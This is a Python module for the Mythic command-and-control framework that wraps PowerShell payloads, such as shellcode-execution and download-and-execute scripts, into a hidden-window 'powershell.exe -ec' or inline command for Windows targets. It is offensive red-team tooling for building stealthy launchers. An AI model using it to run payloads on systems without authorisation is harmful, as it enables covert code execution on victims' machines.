import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class powershell_to_cmd(PayloadType):
    name = "powershell_to_cmd"
    file_extension = "cmd"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["psh_shellcode_execution", "psh_download_execute_psh"]
    note = """Converts a powershell script to a cmd command"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "cmd"
    agent_icon_path = agent_path / "agent_functions" / "basic_python_agent.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
         BuildParameter(
            name = "mode",
            parameter_type=BuildParameterType.ChooseOne,
            choices=['inline', 'base64'],
            default_value='base64',
            description="Defines how to encode the powershell code",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            ps1_script = self.wrapped_payload.decode()

            mode = self.get_parameter('mode')

            if mode == 'base64':
                ps1_base64 = ps_base64(ps1_script)
                cmd_line = f'powershell.exe -window hidden -ec {ps1_base64}'
            elif mode == 'inline':
                ps1_inline = ps_to_oneliner(ps1_script)
                cmd_line = f'powershell.exe -window hidden -c "{ps1_inline}"'
            else:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Error building payload: Unknown mode"



            resp.payload = cmd_line
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

def ps_base64(script: str) -> str:
    # PowerShell -EncodedCommand requires UTF-16LE
    encoded = base64.b64encode(script.encode('utf-16le')).decode()
    return encoded



def ps_to_oneliner(ps_code):
    lines = ps_code.splitlines()
    oneliner = []

    for line in lines:
        # Remove leading/trailing whitespace
        stripped = line.strip()

        # Skip empty lines and comments
        if not stripped or stripped.startswith("#"):
            continue

        # Escape embedded double quotes with PowerShell's backtick
        escaped = stripped.replace('"', '`"')
        oneliner.append(escaped)

    return "; ".join(oneliner)
